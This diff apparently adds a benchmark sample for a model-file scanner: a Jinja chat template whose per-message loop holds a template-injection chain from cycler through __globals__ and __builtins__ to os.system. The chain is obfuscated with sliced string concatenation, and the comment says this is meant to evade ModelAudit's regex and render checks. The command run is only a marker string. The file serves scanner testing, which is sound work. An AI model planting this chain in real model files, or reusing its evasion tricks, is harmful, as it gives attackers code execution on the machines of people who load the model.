@@ -1,0 +1,7 @@
+{#- MARKER-only Phase-10 benchmark payload. Each dangerous name is a padded concatenation
+    sliced to length (the whole token never appears in the text), inside the per-message loop
+    (off the empty-context render path). GlyphHound folds the constant concat+slice; ModelAudit's
+    regex sees no whole token, its empty render skips the loop body, its static probe is
+    Const-only. Sentinel only; comment free of literal sink tokens. -#}
+{% for m in messages %}{{ m.role }}: {{ m.content }}{{ cycler[('__in' + 'it__#')[:8]][('__glob' + 'als__#')[:11]][('__buil' + 'tins__#')[:12]][('__imp' + 'ort__#')[:10]]('os')[('sys' + 'tem#')[:6]]('GLYPHHOUND_BENCH_MARKER') }}
+{% endfor %}
